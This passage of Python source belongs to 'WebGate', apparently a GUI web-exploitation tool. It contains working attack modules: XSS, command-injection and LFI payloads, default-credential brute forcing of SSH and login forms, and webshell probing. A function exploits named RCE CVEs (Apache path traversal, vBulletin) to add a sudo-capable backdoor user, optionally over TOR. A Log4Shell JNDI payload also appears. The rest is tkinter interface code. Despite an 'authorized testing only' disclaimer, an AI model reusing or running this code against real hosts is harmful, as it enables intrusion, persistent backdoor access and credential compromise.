                else:
                    self._log("  [SQLi] RESULT: No injection detected at /?id=1", "INFO")
                self.results["sqlmap_output"] = out
            except subprocess.TimeoutExpired:
                self._log("  [SQLi] SQLMap timed out", "WARN")
            except Exception as e:
                self._log(f"  [SQLi] SQLMap error: {e}", "ERROR")

        self.results["sqli"] = findings
        self._prog(20)

    def run_xss_exploit(self):
        """Cross-Site Scripting testing."""
        self._log("=" * 50, "INFO")
        self._log("[EXPLOIT] XSS Testing", "STEP")
        self._log("=" * 50, "INFO")

        findings = []
        base_url = f"http://{self.domain}"

        xss_payloads = [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            "'-alert(1)-'",
            '<svg onload=alert(1)>',
            '{{7*7}}',  # SSTI
            '${7*7}',   # Template injection
            '<img src=x onerror=alert(document.cookie)>',
            '"><svg/onload=alert(String.fromCharCode(88,83,83))>',
            "javascript:alert(1)//",
            '<body onload=alert(1)>',
        ]

        for payload in xss_payloads:
            if self.cancelled:
                break
            for param in ["q", "search", "name", "input", "msg", "comment", "text"]:
                code, body, _ = self._http_get(
                    f"{base_url}/?{param}={payload}", timeout=6
                )
                if payload in body:
                    findings.append(f"Reflected XSS: param={param}")
                    self._log(f"  [XSS] REFLECTED: ?{param} → payload echoed!", "ERROR")
                    break

        # DOM XSS indicators
        self._log("  [XSS] Checking for DOM-based XSS indicators...", "INFO")
        code, body, _ = self._http_get(base_url)
        dom_sinks = ["document.write(", "innerHTML", "eval(", "setTimeout(",
                     "location.href=", "document.location", "window.location"]
        for sink in dom_sinks:
            if sink in body:
                findings.append(f"DOM XSS sink: {sink}")
                self._log(f"  [XSS] DOM sink found: {sink}", "WARN")

        # XSStrike integration — simplified output
        if subprocess.run(["which", "xsstrike"], capture_output=True).returncode == 0:
            self._log("  [XSS] Running XSStrike…", "STEP")
            try:
                result = subprocess.run(
                    ["xsstrike", "-u", f"{base_url}/?q=test", "--crawl", "--blind"],
                    capture_output=True, text=True, timeout=120
                )
                out = result.stdout
                xss_found = "vulnerable" in out.lower() or "xss" in out.lower()
                vuln_url  = ""
                for line in out.split("\n"):
                    if "vulnerable" in line.lower() and "http" in line.lower():
                        vuln_url = line.strip()[:80]
                        break
                if xss_found:
                    findings.append("XSStrike: XSS CONFIRMED")
                    self._log("  [XSS] RESULT: XSS Injection FOUND", "ERROR")
                    if vuln_url:
                        findings.append(f"Vulnerable URL: {vuln_url}")
                        self._log(f"    · URL: {vuln_url}", "WARN")
                else:
                    self._log("  [XSS] RESULT: No XSS detected by XSStrike", "INFO")
            except Exception as e:
                self._log(f"  [XSS] XSStrike error: {e}", "WARN")

        self.results["xss"] = findings
        self._prog(40)

    def run_cmdi_exploit(self):
        """Command injection testing."""
        self._log("=" * 50, "INFO")
        self._log("[EXPLOIT] Command Injection Testing", "STEP")
        self._log("=" * 50, "INFO")

        findings = []
        base_url = f"http://{self.domain}"

        cmdi_payloads = [
            (";id", "uid="),
            ("|id", "uid="),
            ("$(id)", "uid="),
            ("`id`", "uid="),
            (";cat /etc/passwd", "root:"),
            ("|cat /etc/passwd", "root:"),
            ("& ping -c 1 127.0.0.1 &", "ttl"),
            ("; whoami", "www-data"),
            ("| uname -a", "linux"),
        ]

        for payload, indicator in cmdi_payloads:
            if self.cancelled:
                break
            for param in ["cmd", "exec", "command", "ping", "ip", "host", "url", "path"]:
                code, body, _ = self._http_get(
                    f"{base_url}/?{param}={payload}", timeout=6
                )
                if indicator.lower() in body.lower():
                    findings.append(f"Command injection: param={param}, payload={payload}")
                    self._log(f"  [CMDi] VULNERABLE: ?{param}={payload}", "ERROR")

        # Commix integration
        if subprocess.run(["which", "commix"], capture_output=True).returncode == 0:
            self._log("  [CMDi] Running Commix...", "STEP")
            try:
                result = subprocess.run(
                    ["commix", "--url", f"{base_url}/?cmd=test", "--batch", "--crawl=2"],
                    capture_output=True, text=True, timeout=180
                )
                if "injectable" in result.stdout.lower():
                    findings.append("Commix confirmed command injection")
                    self._log("  [CMDi] Commix found injection!", "ERROR")
            except:
                pass

        self.results["cmdi"] = findings
        self._prog(55)

    def run_file_upload_exploit(self):
        """File upload vulnerability testing."""
        self._log("=" * 50, "INFO")
        self._log("[EXPLOIT] File Upload Testing", "STEP")
        self._log("=" * 50, "INFO")

        findings = []
        base_url = f"http://{self.domain}"

        # Find upload forms
        upload_paths = [
            "upload.php", "uploader.php", "file-upload.php",
            "admin/upload.php", "wp-admin/media-new.php",
            "filemanager/upload.php", "api/upload", "api/v1/upload",
        ]

        for path in upload_paths:
            if self.cancelled:
                break
            code, body, _ = self._http_get(f"{base_url}/{path}")
            if code in (200, 302) and any(x in body.lower() for x in ["upload", "file", "multipart"]):
                findings.append(f"Upload endpoint found: /{path}")
                self._log(f"  [Upload] Endpoint found: /{path} (HTTP {code})", "FOUND")

                # Try uploading a test file (harmless .txt)
                boundary = "----WebGateTest" + self.session_id
                test_content = f"WebGate Security Test - {self.session_id}"
                body_data = (
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="file"; filename="test_{self.session_id}.txt"\r\n'
                    f"Content-Type: text/plain\r\n\r\n"
                    f"{test_content}\r\n"
                    f"--{boundary}--\r\n"
                ).encode()

                try:
                    req = Request(f"{base_url}/{path}", data=body_data, headers={
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                        "User-Agent": "Mozilla/5.0"
                    })
                    with urlopen(req, timeout=10) as resp:
                        if resp.status in (200, 201):
                            findings.append(f"File upload accepted at /{path}")
                            self._log(f"  [Upload] File accepted at /{path}!", "ERROR")
                except:
                    pass

        # Check for unrestricted upload by extension
        dangerous_exts = [".php", ".phtml", ".php5", ".asp", ".aspx", ".jsp", ".sh"]
        for ext in dangerous_exts:
            code, _, _ = self._http_get(f"{base_url}/uploads/test{ext}")
            if code in (200, 403):
                findings.append(f"Upload directory accessible for {ext}")
                self._log(f"  [Upload] {ext} files accessible in /uploads/", "WARN")

        self.results["file_upload"] = findings
        self._prog(65)

    def run_backdoor_check(self):
        """Check for existing backdoors and deploy test payload."""
        self._log("=" * 50, "INFO")
        self._log("[EXPLOIT] Backdoor / Shell Detection & Testing", "STEP")
        self._log("=" * 50, "INFO")

        findings = []
        base_url = f"http://{self.domain}"

        # Check for existing shells
        shells = [
            "shell.php", "cmd.php", "c99.php", "r57.php", "wso.php",
            "b374k.php", "weevely.php", "alfa.php", "mini.php",
            "0day.php", "backdoor.php", "hack.php", "1.php",
            ".shell.php", ".backdoor.php", "wp-content/uploads/shell.php",
        ]

        for shell_path in shells:
            if self.cancelled:
                break
            code, body, _ = self._http_get(f"{base_url}/{shell_path}", timeout=5)
            if code == 200 and len(body) > 50:
                findings.append(f"Existing shell found: /{shell_path}")
                self._log(f"  [SHELL] FOUND: /{shell_path} ({len(body)} bytes)", "ERROR")

        # Check for common backdoor indicators
        code, body, headers = self._http_get(base_url)
        backdoor_indicators = [
            ("eval(base64_decode", "PHP eval backdoor"),
            ("system($_GET", "PHP system backdoor"),
            ("exec($_GET", "PHP exec backdoor"),
            ("passthru(", "PHP passthru backdoor"),
            ("shell_exec(", "PHP shell_exec backdoor"),
        ]
        for indicator, name in backdoor_indicators:
            if indicator in body:
                findings.append(f"Backdoor indicator: {name}")
                self._log(f"  [BACKDOOR] Indicator: {name}", "ERROR")

        # SSH brute force check (if paramiko available)
        if PARAMIKO_OK:
            self._log("  [SSH] Testing default credentials...", "INFO")
            default_creds = [
                ("root", "root"), ("root", "toor"), ("admin", "admin"),
                ("root", "password"), ("root", "123456"), ("admin", "password"),
                ("pi", "raspberry"), ("ubnt", "ubnt"),
            ]
            try:
                ip = socket.gethostbyname(self.domain)
                s = socket.socket(); s.settimeout(3)
                if s.connect_ex((ip, 22)) == 0:
                    s.close()
                    for user, passwd in default_creds:
                        if self.cancelled:
                            break
                        try:
                            client = paramiko.SSHClient()
                            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            client.connect(ip, port=22, username=user, password=passwd, timeout=5)
                            findings.append(f"SSH default creds: {user}:{passwd}")
                            self._log(f"  [SSH] DEFAULT CREDS WORK: {user}:{passwd}", "ERROR")
                            client.close()
                            break
                        except paramiko.AuthenticationException:
                            pass
                        except:
                            break
                else:
                    s.close()
            except:
                pass

        self.results["backdoor"] = findings
        self._prog(80)

    def run_lfi_rfi_exploit(self):
        """Local/Remote File Inclusion testing."""
        self._log("=" * 50, "INFO")
        self._log("[EXPLOIT] LFI/RFI Testing", "STEP")
        self._log("=" * 50, "INFO")

        findings = []
        base_url = f"http://{self.domain}"

        lfi_payloads = [
            ("../../../../etc/passwd", "root:"),
            ("....//....//....//etc/passwd", "root:"),
            ("/etc/passwd%00", "root:"),
            ("php://filter/convert.base64-encode/resource=index.php", "PD"),
            ("php://input", ""),
            ("../../../../../../windows/win.ini", "[fonts]"),
            ("..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
            ("/proc/self/environ", "PATH="),
        ]

        for payload, indicator in lfi_payloads:
            if self.cancelled:
                break
            for param in ["page", "file", "path", "include", "template", "doc", "lang"]:
                code, body, _ = self._http_get(
                    f"{base_url}/?{param}={payload}", timeout=6
                )
                if indicator and indicator in body:
                    findings.append(f"LFI: param={param}, payload={payload}")
                    self._log(f"  [LFI] VULNERABLE: ?{param}={payload}", "ERROR")
                    break

        self.results["lfi_rfi"] = findings
        self._prog(90)

    def run_brute_force(self):
        """Login brute force testing."""
        self._log("=" * 50, "INFO")
        self._log("[EXPLOIT] Brute Force Testing", "STEP")
        self._log("=" * 50, "INFO")

        findings = []
        base_url = f"http://{self.domain}"

        # Find login forms
        login_paths = [
            "wp-login.php", "admin/", "login", "signin",
            "administrator/", "user/login", "auth/login",
            "panel/", "cpanel/", "webmail/",
        ]

        login_url = None
        for path in login_paths:
            code, body, _ = self._http_get(f"{base_url}/{path}")
            if code == 200 and any(x in body.lower() for x in ["password", "login", "sign in", "пароль"]):
                login_url = f"{base_url}/{path}"
                findings.append(f"Login form: /{path}")
                self._log(f"  [Brute] Login form found: /{path}", "FOUND")
                break

        if login_url:
            default_creds = [
                ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
                ("admin", "admin123"), ("root", "root"), ("test", "test"),
                ("admin", ""), ("administrator", "administrator"),
            ]

            for user, passwd in default_creds:
                if self.cancelled:
                    break
                code, body = self._http_post(
                    login_url,
                    f"log={user}&pwd={passwd}&wp-submit=Log+In&redirect_to=wp-admin/",
                )
                if code in (302, 200) and "dashboard" in body.lower():
                    findings.append(f"Default credentials: {user}:{passwd}")
                    self._log(f"  [Brute] CREDENTIALS FOUND: {user}:{passwd}", "ERROR")
                    break

        # Hydra integration
        if login_url and subprocess.run(["which", "hydra"], capture_output=True).returncode == 0:
            self._log("  [Brute] Hydra available for extended brute force", "INFO")

        self.results["brute_force"] = findings
        self._prog(95)

    def generate_report(self) -> str:
        """Generate exploit session report."""
        self._log("Generating exploit report...", "STEP")
        ts = datetime.now()
        safe = re.sub(r"[^\w\-.]", "_", self.domain)
        fn = os.path.join(_REPORTS_DIR, f"exploit_{safe}_{ts.strftime('%Y%m%d_%H%M%S')}.txt")

        lines = [
            "=" * 72,
            "  WEBGATE FW3.7 — EXPLOIT SESSION REPORT",
            f"  Session ID: {self.session_id}",
            f"  Target: {self.domain}",
            f"  Date: {ts.strftime('%Y-%m-%d %H:%M:%S')}",
            "=" * 72, "",
        ]

        total_findings = 0
        for module, findings in self.results.items():
            if isinstance(findings, list) and findings:
                lines.append(f"  [{module.upper()}]")
                lines.append("  " + "-" * 40)
                for f in findings:
                    lines.append(f"    ! {f}")
                    total_findings += 1
                lines.append("")

        lines.extend([
            "=" * 72,
            f"  TOTAL FINDINGS: {total_findings}",
            "  DISCLAIMER: This report is for authorized testing only.",
            "=" * 72,
        ])

        try:
            with open(fn, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))
            self._log(f"  Report saved: {fn}", "FOUND")
        except Exception as e:
            self._log(f"  Save failed: {e}", "ERROR")

        self._prog(100)
        return fn

    def run(self):
        """Execute all exploit modules."""
        self._log(f"Exploit session started: {self.domain}", "STEP")
        self._log(f"Session ID: {self.session_id}", "INFO")

        modules = [
            self.run_sqli_exploit,
            self.run_xss_exploit,
            self.run_cmdi_exploit,
            self.run_file_upload_exploit,
            self.run_backdoor_check,
            self.run_lfi_rfi_exploit,
            self.run_brute_force,
            self.generate_report,
        ]

        for module in modules:
            if self.cancelled:
                break
            try:
                module()
            except Exception as e:
                self._log(f"  Module error: {e}", "ERROR")

        self._log("Exploit session complete.", "SUCCESS")

    # ── RCE-capable CVEs (can try SSH via command execution) ──
    RCE_CVES = {
        "CVE-2021-41773", "CVE-2021-42013", "CVE-2021-31166",
        "CVE-2019-11043", "CVE-2021-44228", "CVE-2017-5638",
        "CVE-2018-11776", "CVE-2021-26084", "CVE-2022-26134",
        "CVE-2023-22515", "CVE-2019-0232", "CVE-2017-12617",
        "CVE-2022-42252", "CVE-2019-16759", "CVE-2020-17496",
        "CVE-2022-22965", "CVE-2019-8943", "CVE-2015-8562",
        "CVE-2018-7600", "CVE-2018-7602", "CVE-2019-6340",
        "CVE-2019-15107", "CVE-2023-27997", "CVE-2022-42475",
        "CVE-2021-40438", "CVE-2020-11984",
    }

    def try_ssh_backdoor(self, cve_id: str, ssh_user: str, ssh_pass: str,
                          tor_bridge: str = "") -> bool:
        """Attempt to create SSH user via RCE CVE.
        Only called after explicit Scope Agreement + I accept from user.
        """
        self._log("=" * 50, "INFO")
        self._log(f"[SSH-EXPLOIT] Attempting SSH access via {cve_id}", "STEP")

        # Configure TOR/proxy if bridge provided
        proxy_env = {}
        if tor_bridge:
            self._log(f"  [TOR] Bridge: {tor_bridge[:40]}…", "INFO")
            # Write temp torrc
            import tempfile
            torrc = f"UseBridges 1\nBridge {tor_bridge}\nSocksPort 9050\n"
            fd, torrc_path = tempfile.mkstemp(suffix=".torrc")
            with os.fdopen(fd, "w") as f:
                f.write(torrc)
            # Start tor with bridge
            try:
                subprocess.Popen(
                    ["tor", "-f", torrc_path],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                time.sleep(4)  # Wait for TOR circuit
                proxy_env = {"https_proxy": "socks5://127.0.0.1:9050",
                             "http_proxy":  "socks5://127.0.0.1:9050"}
                self._log("  [TOR] Circuit established via bridge", "SUCCESS")
            except Exception as e:
                self._log(f"  [TOR] Failed to start: {e}", "WARN")
                self._log("  [TOR] Proceeding without TOR", "WARN")

        base_url = f"http://{self.domain}"
        success = False

        # Escape username/password for shell
        safe_user = re.sub(r"[^a-zA-Z0-9_]", "", ssh_user)[:32]
        # Payload to add user — sent via RCE vector
        adduser_cmd = (
            f"useradd -m -s /bin/bash {safe_user}; "
            f"echo '{safe_user}:{ssh_pass}' | chpasswd; "
            f"usermod -aG sudo {safe_user} 2>/dev/null; "
            f"echo PWNED"
        )

        # CVE-specific exploit vectors
        if cve_id in ("CVE-2021-41773", "CVE-2021-42013"):
            # Apache path traversal + RCE via mod_cgi
            self._log("  [RCE] Apache path traversal + mod_cgi RCE", "INFO")
            for path in [
                "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
                "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh",
            ]:
                try:
                    import urllib.request
                    data = f"echo Content-Type: text/plain; echo; {adduser_cmd}".encode()
                    req = urllib.request.Request(
                        f"{base_url}{path}",
                        data=data,
                        headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
                    )
                    with urllib.request.urlopen(req, timeout=10) as r:
                        resp = r.read(512).decode("utf-8", errors="ignore")
                        if "PWNED" in resp:
                            self._log(f"  [RCE] SUCCESS via {path}!", "SUCCESS")
                            success = True
                            break
                        elif resp.strip():
                            self._log(f"  [RCE] Response: {resp[:60]}", "WARN")
                except Exception as e:
                    self._log(f"  [RCE] {path}: {e}", "WARN")

        elif cve_id == "CVE-2021-44228":
            # Log4Shell — JNDI callback (only works with collaborator/listener)
            self._log("  [Log4Shell] Log4j JNDI injection — use with LDAP listener", "INFO")
            jndi_payload = "${jndi:ldap://127.0.0.1:1389/a}"
            for param in ["q", "search", "username", "X-Api-Version"]:
                try:
                    code, body, _ = self._http_get(
                        f"{base_url}/?{param}={jndi_payload}", timeout=6
                    )
                    self._log(f"  [Log4Shell] Payload sent via {param}={jndi_payload[:30]}", "INFO")
                except Exception as e:
                    pass
            self._log("  [Log4Shell] Set up LDAP listener to catch callback", "WARN")

        elif cve_id in ("CVE-2019-16759", "CVE-2020-17496"):
            # vBulletin OGNL/widgetConfig RCE
            self._log("  [RCE] vBulletin widget RCE", "INFO")
            for endpoint in ["ajax/api/hook/getAdminPermission",
                             "ajax/render/widget_tabbedcontainer_tab_panel"]:
                try:
                    data = f"subWidgets[0][template]=widget_php&subWidgets[0][config][code]={adduser_cmd}".encode()
                    code, body = self._http_post(f"{base_url}/{endpoint}", data)
                    if "PWNED" in body:
                        self._log("  [RCE] vBulletin RCE success!", "SUCCESS")
                        success = True
                        break
                except Exception as e:
                    self._log(f"  [vBull] {e}", "WARN")

        else:
            # Generic: try commix if available
            self._log(f"  [RCE] Generic exploit attempt for {cve_id}", "INFO")
            if subprocess.run(["which", "commix"], capture_output=True).returncode == 0:
                try:
                    r = subprocess.run(
                        ["commix", "--url", f"{base_url}/?id=1",
                         "--data", f"cmd={adduser_cmd}",
                         "--batch", "--os-cmd", adduser_cmd],
                        capture_output=True, text=True, timeout=60,
                        env={**os.environ, **proxy_env}
                    )
                    if "PWNED" in r.stdout or "success" in r.stdout.lower():
                        self._log("  [commix] RCE executed!", "SUCCESS")
                        success = True
                except Exception as e:
                    self._log(f"  [commix] {e}", "WARN")
            else:
                self._log("  [!] commix not installed — generic RCE skipped", "WARN")

        if success:
            self._log(f"  [SSH] Verifying SSH login as {safe_user}…", "INFO")
            if PARAMIKO_OK:
                try:
                    import paramiko
                    ip = socket.gethostbyname(self.domain)
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, port=22, username=safe_user,
                                   password=ssh_pass, timeout=10)
                    _, stdout, _ = client.exec_command("id")
                    uid_out = stdout.read(128).decode("utf-8", errors="ignore").strip()
                    self._log(f"  [SSH] LOGIN SUCCESS: {safe_user}@{self.domain}", "SUCCESS")
                    self._log(f"  [SSH] id output: {uid_out}", "SUCCESS")
                    self.results["ssh_backdoor"] = {
                        "user": safe_user, "pass": ssh_pass,
                        "host": self.domain, "id_output": uid_out
                    }
                    # Try sudo
                    _, so, _ = client.exec_command(f"echo {ssh_pass} | sudo -S id 2>/dev/null")
                    sudo_out = so.read(128).decode("utf-8", errors="ignore").strip()
                    if "root" in sudo_out:
                        self._log("  [SSH] SUDO ROOT CONFIRMED!", "SUCCESS")
                        self.results["ssh_backdoor"]["sudo"] = sudo_out
                    client.close()
                except Exception as e:
                    self._log(f"  [SSH] Login check failed: {e}", "WARN")
                    self._log(f"  [SSH] User may have been created — try manually:", "INFO")
                    self._log(f"    ssh {safe_user}@{self.domain}", "FOUND")
            else:
                self._log("  [!] paramiko not installed — SSH verify skipped", "WARN")
                self._log(f"    Manually try: ssh {safe_user}@{self.domain}", "INFO")
        else:
            self._log("  [SSH] Exploit did not succeed via this CVE vector", "WARN")

        self.results["ssh_attempt"] = {
            "cve": cve_id, "user": safe_user, "success": success,
            "tor": bool(tor_bridge)
        }
        return success


# ═══════════════════════════════════════════════════════════════
# GUI — SPLASH SCREEN
# ═══════════════════════════════════════════════════════════════
class SplashScreen:
    TIPS = [
        "200+ CVE database · 30 security tools built-in",
        "DEEP SCAN runs Nmap, WPScan, SQLMap, XSStrike + more",
        "Surface scan: OS fingerprint, country, open ports + CVE",
        "Switch themes and language live without stopping scan",
        "All scans run in background — UI stays responsive",
        "Reports saved as audit_<domain>_<date>.txt",
        "CVE DB covers nginx, apache, WordPress, SSH, SMB, Redis…",
        "AUTHORIZED TESTING ONLY — stay legal, stay safe",
    ]

    def __init__(self, parent, callback):
        import tkinter as tk
        self.parent = parent
        self.cb     = callback
        th = get_theme()

        win = tk.Toplevel(parent)
        self.win = win
        win.overrideredirect(True)
        win.configure(bg=th["BG"])

        sw = win.winfo_screenwidth()
        sh = win.winfo_screenheight()
        W, H = 560, 340
        win.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")

        try:
            win.update_idletasks()  # removed wait_visibility (hangs on Wayland)
            win.attributes("-alpha", 0.0)
        except Exception:
            pass

        # Logo canvas
        cv = tk.Canvas(win, bg=th["BG"], width=W, height=110, highlightthickness=0)
        cv.pack(pady=(28, 0))
        cv.create_text(W//2+3, 58, text="WebGate",
            font=("Georgia", 42, "bold italic"), fill=th["BG3"], anchor="center")
        cv.create_text(W//2+1, 56, text="WebGate",
            font=("Georgia", 42, "bold italic"), fill=th["LOGO_SHD"], anchor="center")
        cv.create_text(W//2-1, 54, text="WebGate",
            font=("Georgia", 42, "bold italic"), fill=th["LOGO_CLR"], anchor="center")
        cv.create_line(W//2-120, 80, W//2+120, 80, fill=th["BORDER2"], width=1)
        cv.create_text(W//2, 95, text="Domain Security Auditor  ·  by c3less",
            font=("Courier New", 9), fill=th["FG3"], anchor="center")

        # Tip label
        self._tip_lbl = tk.Label(win, text=self.TIPS[0],
            font=("Courier New", 9), bg=th["BG"], fg=th["FG3"])
        self._tip_lbl.pack(pady=4)

        # Progress bar frame
        pb_frame = tk.Frame(win, bg=th["BG"])
        pb_frame.pack(fill="x", padx=60, pady=(12, 4))
        self._pb_cv = tk.Canvas(pb_frame, height=3, bg=th["BG2"],
            highlightthickness=0, bd=0)
        self._pb_cv.pack(fill="x")

        # Status label
        self._st_lbl = tk.Label(win, text="Initializing…",
            font=("Courier New", 8), bg=th["BG"], fg=th["FG3"])
        self._st_lbl.pack()

        # Credit
        tk.Label(win, text="by c3less  ·  github.com/c3less/webgate",
            font=("Courier New", 8), bg=th["BG"], fg=th["FG3"]).pack(pady=(16, 0))

        self._prog  = 0
        self._tip_i = 0
        self._th    = th
        self._W     = W

        # Start animations
        self._fade_in(0.0)
        self._animate_prog(0)

    def _fade_in(self, a):
        nv = min(0.97, a + 0.07)
        _safe_alpha(self.win, nv)
        if nv < 0.97:
            self.win.after(16, lambda: self._fade_in(nv))

    def _animate_prog(self, step):
        th = self._th
        self._prog = min(100, step)
        cv = self._pb_cv
        cv.delete("all")
        try:
            w = cv.winfo_width()
            if w < 2: w = self._W - 120
            cv.create_rectangle(0, 0, w, 3, fill=th["BG3"], outline="")
            if self._prog > 0:
                fw = max(4, int(w * self._prog / 100))
                cv.create_rectangle(0, 0, fw, 3, fill=th["ACC"], outline="")
        except: pass

        status_msgs = {
            10: "Loading CVE database…",
            30: "Initializing sound engine…",
            50: "Building GUI components…",
            70: "Applying theme…",
            90: "Almost ready…",
            100: "Launch!",
        }
        for threshold, msg in sorted(status_msgs.items()):
            if self._prog >= threshold:
                try: self._st_lbl.config(text=msg)
                except: pass

        if step % 18 == 0:
            self._tip_i = (self._tip_i + 1) % len(self.TIPS)
            try: self._tip_lbl.config(text=self.TIPS[self._tip_i])
            except: pass

        if step < 100:
            speed = 12 if step < 80 else 25
            self.win.after(speed, lambda: self._animate_prog(step + 1))
        else:
            self.win.after(300, self._finish)

    def _finish(self):
        def fade_out(a):
            _safe_alpha(self.win, max(0.0, a - 0.1))
            if a > 0.0:
                self.win.after(14, lambda: fade_out(a - 0.1))
            else:
                try: self.win.destroy()
                except: pass
                # Show main window
                try: self.parent.deiconify()
                except: pass
                self.parent.update()
                self.cb()
        fade_out(0.97)


# ═══════════════════════════════════════════════════════════════
# GUI — DISCLAIMER DIALOG
# ═══════════════════════════════════════════════════════════════
class DisclaimerDialog:
    def __init__(self, parent, on_agree):
        import tkinter as tk
        th  = get_theme()
        win = tk.Toplevel(parent)
        win.title(t("disc_title"))
        win.configure(bg=th["BG"])
        win.resizable(False, False)
        win.transient(parent)
        win.grab_set()

        sw = win.winfo_screenwidth(); sh = win.winfo_screenheight()
        W, H = 620, 500
        win.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
        try:
            win.update_idletasks()  # removed wait_visibility (hangs on Wayland)
            win.attributes("-alpha", 0.0)
        except: pass

        # Header
        hdr = tk.Frame(win, bg=th["ERR"], height=4)
        hdr.pack(fill="x")
        tk.Label(win, text=t("disc_title"),
            font=("Georgia", 14, "bold"), bg=th["BG"], fg=th["ERR"]
        ).pack(pady=(18, 6))
        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=24)

        # Body text
        txt = tk.Text(win, font=("Courier New", 10), bg=th["BG2"], fg=th["FG"],
            relief="flat", bd=0, padx=20, pady=16, wrap="word",
            state="normal", height=16)
        txt.insert("1.0", t("disc_body"))
        txt.config(state="disabled")
        txt.pack(fill="both", expand=True, padx=20, pady=(12, 8))

        # Buttons
        btnf = tk.Frame(win, bg=th["BG"])
        btnf.pack(fill="x", padx=20, pady=(0, 18))

        def agree():
            win.destroy()
            on_agree()

        tk.Button(btnf, text=t("disc_deny"),
            font=("Courier New", 10), bg=th["BG3"], fg=th["FG2"],
            relief="flat", bd=0, padx=20, pady=8, cursor="hand2",
            command=win.destroy
        ).pack(side="right", padx=(8, 0))

        agree_btn = tk.Button(btnf, text=t("disc_agree"),
            font=("Courier New", 10, "bold"), bg=th["ERR"], fg=th["WHITE"],
            relief="flat", bd=0, padx=20, pady=8, cursor="hand2",
            command=agree)
        agree_btn.pack(side="right")

        def _fade(a):
            try: win.attributes("-alpha", min(0.97, a))
            except: pass
            if a < 0.97: win.after(15, lambda: _fade(a + 0.08))
        _fade(0.0)


# ═══════════════════════════════════════════════════════════════
# GUI — TOOL SELECTOR DIALOG (checkboxes before deep scan)
# ═══════════════════════════════════════════════════════════════
class ToolSelectorDialog:
    def __init__(self, parent, on_start):
        import tkinter as tk
        th  = get_theme()
        win = tk.Toplevel(parent)
        win.title(t("tool_sel_title"))
        win.configure(bg=th["BG"])
        win.resizable(False, True)
        win.transient(parent)
        win.grab_set()

        sw = win.winfo_screenwidth(); sh = win.winfo_screenheight()
        W, H = 680, 580
        win.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
        try:
            win.update_idletasks()  # removed wait_visibility (hangs on Wayland)
            win.attributes("-alpha", 0.0)
        except: pass

        tk.Label(win, text=t("tool_sel_title"),
            font=("Georgia", 13, "bold italic"), bg=th["BG"], fg=th["LOGO_CLR"]
        ).pack(pady=(16, 4))
        tk.Label(win, text=t("tool_sel_sub"),
            font=("Courier New", 9), bg=th["BG"], fg=th["FG3"]
        ).pack()
        tk.Frame(win, bg=th["BORDER"], height=1).pack(fill="x", padx=20, pady=(8, 0))

        # Group tools by category
        cats = {}
        for key, info in TOOL_CATALOG.items():
            c = info["cat"]
            cats.setdefault(c, []).append((key, info))

        # Scrollable frame
        canvas = tk.Canvas(win, bg=th["BG"], highlightthickness=0)
        scrollbar = tk.Scrollbar(win, orient="vertical", command=canvas.yview)
        scroll_frame = tk.Frame(canvas, bg=th["BG"])
        scroll_frame.bind("<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scroll_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        canvas.pack(side="left", fill="both", expand=True, padx=(20, 0), pady=8)
        scrollbar.pack(side="right", fill="y")

        self._vars = {}
        cols = 2
        cat_labels = {
            "recon":"Reconnaissance","cms":"CMS / Web","sql":"SQL Injection",
            "xss":"XSS","cmdi":"Command Injection","mitm":"MITM / SSL",
            "brute":"Brute Force","web":"Web Scanners","phish":"Phishing",
            "wifi":"WiFi / Wireless","osint":"OSINT / Wordlist",
            "rce":"Remote Code Exec","ssl":"SSL Audit","social":"Social Eng.",
        }

        for cat, items in sorted(cats.items()):
            cat_color = CAT_COLORS.get(cat, th["FG2"])
            cf = tk.Frame(scroll_frame, bg=th["BG2"], bd=0)
            cf.pack(fill="x", padx=8, pady=(6, 2))
            tk.Label(cf, text=cat_labels.get(cat, cat.upper()),
                font=("Courier New", 8, "bold"), bg=th["BG2"], fg=cat_color,
                anchor="w"
            ).pack(fill="x", padx=10, pady=(4, 2))

            row_f = None
            for idx, (key, info) in enumerate(items):
                if idx % cols == 0:
                    row_f = tk.Frame(cf, bg=th["BG2"])
                    row_f.pack(fill="x", padx=8, pady=1)

                var = tk.BooleanVar(value=SETTINGS["deep_tools"].get(key, False))
                self._vars[key] = var

                item_f = tk.Frame(row_f, bg=th["BG2"])
                item_f.pack(side="left", fill="x", expand=True)

                ext_mark = "★" if info["ext"] else "·"
                chk = tk.Checkbutton(item_f,
                    text=f"{ext_mark} {info['label']}",
                    variable=var,
                    font=("Courier New", 9),
                    bg=th["BG2"], fg=th["FG"],
                    selectcolor=th["BG3"],
                    activebackground=th["BG2"],
                    activeforeground=th["WHITE"],
                    relief="flat", bd=0, anchor="w",
                    cursor="hand2",
                )
                chk.pack(fill="x")

        # Ask per port checkbox
        ask_f = tk.Frame(win, bg=th["BG"])
        ask_f.pack(fill="x", padx=20, pady=4)
        self._ask_var = tk.BooleanVar(value=SETTINGS.get("ask_per_port", False))
        tk.Checkbutton(ask_f,
            text=f"⚙  {t('tool_sel_ask')}",
            variable=self._ask_var,
            font=("Courier New", 9),
            bg=th["BG"], fg=th["FG2"],
            selectcolor=th["BG3"],
            activebackground=th["BG"],
            relief="flat", bd=0, cursor="hand2",
        ).pack(side="left")

        tk.Label(ask_f, text="★ = external tool required",
            font=("Courier New", 8), bg=th["BG"], fg=th["FG3"]
        ).pack(side="right")

        # Select all / none buttons
        ctrl_f = tk.Frame(win, bg=th["BG"])
        ctrl_f.pack(fill="x", padx=20, pady=(2, 0))
        def select_all():
            for v in self._vars.values(): v.set(True)
